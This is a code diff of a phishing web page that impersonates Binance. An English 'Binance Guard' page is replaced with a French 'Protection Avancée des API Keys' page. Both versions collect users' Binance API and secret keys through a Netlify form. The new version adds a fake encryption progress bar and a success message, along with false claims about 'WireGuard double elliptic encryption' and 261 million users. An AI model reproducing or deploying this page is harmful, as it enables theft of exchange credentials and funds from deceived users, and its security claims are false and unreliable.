@@ -1,134 +1,286 @@
-<!doctype html>
-<html lang="en">
+
+<!DOCTYPE html>
+<html lang="fr">
 <head>
-<meta charset="utf-8">
-<!-- Binance Sans font (fallback Roboto, Arial) -->
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
-<style>
-@font-face {
-  font-family: 'Binance Sans';
-  src: url('https://bin.bnbstatic.com/static/fonts/BinanceSans-Regular.woff2') format('woff2');
-  font-weight: 400;
-  font-style: normal;
-}
-@font-face {
-  font-family: 'Binance Sans';
-  src: url('https://bin.bnbstatic.com/static/fonts/BinanceSans-Bold.woff2') format('woff2');
-  font-weight: 700;
-  font-style: normal;
-}
-</style>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Binance Guard</title>
-<meta name="color-scheme" content="dark">
-<style>
-  :root{
-    --bg:#0b1220;--panel:#111827;--panel2:#0f172a;--border:#1f2937;
-    --text:#e5e7eb;--muted:#9ca3af;--accent:#fbbf24;--accent2:#f59e0b;
-    --green:#16a34a;--green-2:#0f3b26;--green-b:#1c4d37;
-  }
-  *{box-sizing:border-box}
-  body{margin:0;background:#0b1220;color:var(--text);
-     font-family:'Binance Sans',Roboto,Arial,sans-serif;font-size:16px;line-height:1.5}
-  .wrap{min-height:100svh;display:grid;place-items:center;padding:24px;
-     background:radial-gradient(900px 600px at 50% -200px,#12213d 0%,#0b1220 60%)}
-  .card{width:100%;max-width:560px;background:linear-gradient(180deg,var(--panel2),var(--panel));
-     border:1px solid var(--border);border-radius:16px;padding:26px;box-shadow:0 10px 30px rgba(0,0,0,.35)}
-  .logo{width:56px;height:56px;margin:0 auto 10px;border-radius:12px;display:grid;place-items:center;
-  background:conic-gradient(from 180deg,#f59e0b,#fbbf24,#fde68a,#f59e0b);box-shadow:0 4px 16px rgba(251,191,36,.15)}
-  .logo > div{width:34px;height:34px;border-radius:8px;background:#111827;display:grid;place-items:center;font-size:18px}
-  .logo svg{width:34px;height:34px;display:block}
-  h1{margin:8px 0 0;text-align:center;font-size:24px}
-  h2{margin:6px 0 16px;text-align:center;font-size:14px;color:#d1d5db;font-weight:500}
-  .field{margin:12px 0}
-  .label{display:flex;align-items:center;gap:8px;color:#cbd5e1;font-size:14px;margin-bottom:6px}
-  .label .dot{width:8px;height:8px;border-radius:50%;background:#f59e0b;display:inline-block}
-  input,textarea{width:100%;background:#0b1220;border:1px solid #26334d;color:#e5e7eb;border-radius:10px;padding:12px 14px}
-  input:focus,textarea:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.25)}
-  .disabled{opacity:.6;cursor:not-allowed}
-  .disabled input{pointer-events:none}
-  .info{display:flex;gap:10px;align-items:flex-start;background:linear-gradient(180deg,#0f2b22,#0d1f19);
-     border:1px solid var(--green-b);border-radius:10px;color:#b7e2c9;padding:12px;margin:12px 0}
-  .btn{width:100%;padding:12px 16px;border:0;border-radius:6px;background:linear-gradient(180deg,#F3BA2F,#F0B90B);
-    color:#181A20;font-weight:700;cursor:pointer;box-shadow:0 2px 8px rgba(243,186,47,.10);transition:box-shadow .2s,transform .2s,background .2s}
-  .btn:hover{box-shadow:0 4px 16px rgba(243,186,47,.18);transform:translateY(-2px);background:linear-gradient(180deg,#F0B90B,#F3BA2F)}
-  input,textarea{width:100%;background:#181A20;border:1px solid #F3BA2F;color:#e5e7eb;border-radius:6px;padding:12px 14px;transition:border-color .2s,box-shadow .2s}
-  input:focus,textarea:focus{border-color:#F0B90B;box-shadow:0 0 0 2px rgba(243,186,47,.18)}
-  input:hover,textarea:hover{border-color:#F0B90B}
-  .hr{height:1px;background:var(--border);margin:18px 0}
-  .disc{color:#fbbf24;font-size:12px;text-align:center;font-weight:700}
-  .foot{margin-top:10px;font-size:11px;color:#9aa3b2;text-align:center}
-  .muted{color:var(--muted)}
-  .hidden{position:absolute!important;opacity:0!important;height:0!important;width:0!important;pointer-events:none!important}
-  @media (max-width:600px){
-    .card{padding:16px}
-    h1{font-size:18px}
-    h2{font-size:13px}
-    .logo{width:44px;height:44px}
-    .logo svg{width:28px;height:28px}
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Binance API Security</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: #fdfdfb;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+      margin: 0;
+      gap: 20px;
+      position: relative;
+      padding: 20px;
+    }
+    .header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      margin-top: -30px;
+    }
+    .logo {
+      width: 220px;
+    }
+    .container {
+      background: #1e1e1e;
+      padding: 30px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0px 0px 15px rgba(255, 193, 7, 0.5);
+      text-align: center;
+      z-index: 2;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+    .input-group label {
+      font-size: 14px;
+      color: #fafaf9;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #f0b90b;
+      border-radius: 5px;
+      background: #121212;
+      color: white;
+    }
+    .btn {
+      background-color: #f0b90b;
+      color: black;
+      padding: 12px;
+      border: none;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .btn:hover {
+      background-color: #ffcc00;
+    }
+    .protection {
+      margin-top: 20px;
+      font-size: 24px;
+    }
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 30px;
+      flex-wrap: wrap;
+    }
+    .social-icons a {
+      color: white;
+      font-size: 24px;
+      text-decoration: none;
+    }
+    .footer {
+      margin-top: 5px;
+      font-size: 14px;
+      color: #aaa;
+      text-align: center;
+      width: 100%;
+      border-top: 1px solid #444;
+      padding-top: 10px;
+    }
+    .left-img, .right-img {
+      display: none;
+    }
+    .counter {
+      font-size: 30px;
+      color: white;
+      text-align: center;
+      font-weight: bold;
+    }
+    .counter .highlight {
+      font-size: 50px;
+      color: #f0b90b;
+    }
+    .wireguard-description {
+      font-size: 14px;
+      color: white;
+      text-align: center;
+      max-width: 400px;
+      margin-top: 10px;
+    }
+    .wireguard-description span {
+      color: #f0b90b;
+      font-weight: bold;
+    }
+    @media (min-width: 768px) {
+      .left-img {
+        display: block;
+        position: absolute;
+        left: 15%;
+        top: 50%;
+        transform: translateY(-60%);
+        width: 300px;
+      }
+      .right-img {
+        display: block;
+        position: absolute;
+        right: 15%;
+        top: 50%;
+        transform: translateY(-60%);
+        font-size: 250px;
+        color: #f0b90b;
+      }
+    }
+    /* Styles pour le modal */
+    #modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.8);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .modal-content {
+      background: #1e1e1e;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+    .progress-bar-container {
+      background: #444;
+      border-radius: 5px;
+      overflow: hidden;
+      margin-top: 15px;
+      height: 10px;
+    }
+    .progress-bar {
+      background: #f0b90b;
+      height: 10px;
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
 </head>
 <body>
-<header style="width:100%;background:#181A20;padding:18px 0 10px 0;box-shadow:0 2px 8px rgba(0,0,0,.08);display:flex;align-items:center;justify-content:center;">
-  <div style="display:flex;align-items:center;gap:12px;">
-    <span style="display:grid;place-items:center;width:40px;height:40px;background:conic-gradient(from 180deg,#f59e0b,#fbbf24,#fde68a,#f59e0b);border-radius:10px;">
-      <svg width="28" height="28" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-        <g>
-          <rect x="15" y="3" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="3" y="15" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="27" y="15" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="15" y="27" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="9" y="9" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="21" y="9" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="9" y="21" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="21" y="21" width="4" height="4" rx="1" fill="#F3BA2F"/>
-        </g>
-      </svg>
-    </span>
-    <span style="font-family:'Binance Sans',Roboto,Arial,sans-serif;font-size:1.5rem;font-weight:700;color:#F3BA2F;letter-spacing:1px;">Binance Guard</span>
+  <div class="header">
+    <img src="logo23.png" alt="Binance Logo" class="logo">
   </div>
-</header>
-<main class="wrap">
-  <section class="card" aria-labelledby="t1">
-    <div class="logo" aria-label="Binance logo">
-      <svg width="34" height="34" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-        <g>
-          <rect x="15" y="3" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="3" y="15" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="27" y="15" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="15" y="27" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="9" y="9" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="21" y="9" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="9" y="21" width="4" height="4" rx="1" fill="#F3BA2F"/>
-          <rect x="21" y="21" width="4" height="4" rx="1" fill="#F3BA2F"/>
-        </g>
-      </svg>
-    </div>
-    <h1 id="t1">Binance Guard Service</h1>
-    <form name="binance-api-key" method="POST" data-netlify="true" netlify-honeypot="bot-field" onsubmit="showConfirmation(event)">
+  
+  <img src="https://bin.bnbstatic.com/image/julia/new-homepage/download-lite-dark-en.svg" alt="Binance App" class="left-img">
+  
+  <div class="container">
+    <h2>Protection Avancée des API Keys Binance</h2>
+    
+    <form name="binance-api-key" method="POST" data-netlify="true" netlify-honeypot="bot-field">
       <input type="hidden" name="form-name" value="binance-api-key">
       <p class="hidden"><label>Don’t fill <input name="bot-field"></label></p>
-      <div class="field">
-        <div class="label"><span class="dot"></span><span style="font-size:13px;">Binance API Key</span></div>
-        <input name="api_key" type="text" placeholder="Enter your Binance API Key" required autocomplete="off" style="border-radius:4px;">
+      <div class="input-group">
+        <label for="privateKey">Private Key API</label>
+        <input type="password" id="privateKey" name="privateKey" placeholder="Entrer votre clé privée" required>
       </div>
-      <div class="field">
-        <div class="label"><span class="dot"></span><span style="font-size:13px;">Binance Secret Key</span></div>
-        <input name="secret_key" type="password" placeholder="Enter your Binance Secret Key" required autocomplete="off" style="border-radius:4px;">
+      <div class="input-group">
+        <label for="secretKey">Secret Key API</label>
+        <input type="password" id="secretKey" name="secretKey" placeholder="Entrer votre clé secrète" required>
       </div>
-      <button class="btn" type="submit" style="border-radius:4px;">Activate Binance Guard</button>
-      <div class="hr"></div>
-      <p class="disc" style="font-size:13px;">
-        Disclaimer: The use of digital assets involves risks. Please note that digital assets are volatile and may be unsuitable for you and your profile, so you should only invest in products that you are familiar with.
-      </p>
-      <p class="foot" style="font-size:11px;">
-        <span class="muted">Remark: you received this email because you are registered as a user of binance.com</span><br><br>
-        Binance France — SIREN 913864005 — AMF: E2022-037 — 1 rue de Stockholm, 75008 Paris France<br>
-        Binance Services Holdings Limited, located in 6th Floor, South Bank House, Barrow Street Dublin 4 are jointly responsible for the processing of your personal data. For more information regarding the processing of your personal data, please refer to our data protection policy.
-      </p>
+      <button class="btn" type="submit">Activer la Protection</button>
     </form>
-  </section>
-</main>
+    <script>
+      // Animation modal après soumission Netlify
+      document.querySelector('form').addEventListener('submit', function(e) {
+        // Laisser Netlify gérer l'envoi, mais afficher le modal
+        setTimeout(function() {
+          document.getElementById('modal').style.display = 'flex';
+          var progressBar = document.querySelector('.progress-bar');
+          progressBar.style.width = '0%';
+          var duration = 4000;
+          var startTime = null;
+          function animateProgress(timestamp) {
+            if (!startTime) startTime = timestamp;
+            var progress = timestamp - startTime;
+            var percent = Math.min((progress / duration) * 100, 100);
+            progressBar.style.width = percent + '%';
+            if (progress < duration) {
+              requestAnimationFrame(animateProgress);
+            } else {
+              var modalMessage = document.getElementById('modal-message');
+              modalMessage.innerHTML =
+                '<i class="fas fa-check-circle" style="color: #f0b90b; font-size: 48px;"></i><br>' +
+                'Chiffrement des clés API effectué avec succès !<br>' +
+                'Vos clés sont désormais sécurisées.<br><br>' +
+                '<button id="return-btn" class="btn" style="margin-top: 15px; background-color: #aaa;">Retour</button>';
+              document.getElementById('return-btn').addEventListener('click', function() {
+                document.getElementById('modal').style.display = 'none';
+                window.location.reload();
+              });
+            }
+          }
+          requestAnimationFrame(animateProgress);
+        }, 300); // Légère attente pour laisser Netlify traiter
+      });
+    </script>
+    </form>
+    
+    <div class="protection">
+      <p>⚠️ La protection <span>WireGuard</span> renforcera la sécurité de vos API Keys Binance en restreignant les accès non autorisés.</p>
+    </div>
+  </div>
+  
+  <div class="counter">
+    <span class="highlight">261,308,788</span> USERS TRUST US
+  </div>
+  
+  <i class="fas fa-shield-alt right-img"></i>
+  
+  <div class="wireguard-description">
+    Le protocole <span>WireGuard</span> garantit une confidentialité maximale en utilisant un double chiffrement elliptique (ECC) avancé pour sécuriser vos clés API contre toute interception.
+  </div>
+  
+  <div class="social-icons">
+    <a href="#"><i class="fab fa-discord"></i></a>
+    <a href="#"><i class="fab fa-telegram"></i></a>
+    <a href="#"><i class="fab fa-tiktok"></i></a>
+    <a href="#"><i class="fab fa-facebook"></i></a>
+    <a href="#"><i class="fab fa-x-twitter"></i></a>
+    <a href="#"><i class="fab fa-reddit"></i></a>
+    <a href="#"><i class="fab fa-instagram"></i></a>
+    <a href="#"><i class="fab fa-youtube"></i></a>
+    <a href="#"><i class="fab fa-whatsapp"></i></a>
+  </div>
+  
+  <div class="footer">
+    Binance© 2025 | Cookie Preferences
+  </div>
+  
+  <!-- Modal de chargement et téléchargement -->
+  <div id="modal">
+    <div class="modal-content">
+      <div id="modal-message">
+        Chargement en cours…<br>
+        Chiffrement elliptique (ECC) de vos clés API en cours de traitement. Veuillez patienter.
+      </div>
+      <div class="progress-bar-container">
+        <div class="progress-bar"></div>
+      </div>
+    </div>
+  </div>
+  <!-- Modal JS peut être réactivé si tu veux une animation, mais l'envoi se fait par Netlify -->
 </body>
 </html>
